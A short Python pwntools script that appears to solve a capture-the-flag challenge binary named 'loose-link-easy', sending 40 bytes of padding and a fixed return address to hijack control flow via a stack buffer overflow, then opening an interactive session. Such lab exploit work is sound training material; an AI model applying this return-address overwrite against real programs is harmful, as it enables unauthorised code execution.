#!/usr/bin/python3


from pwn import *


context.log_level = 'error'
context.arch = "amd64"

elf = context.binary = ELF('/challenge/loose-link-easy')

payload = b"A" *40 +  p64(0x0000000000402552)

io = process()

io.send(payload)

io.interactive()
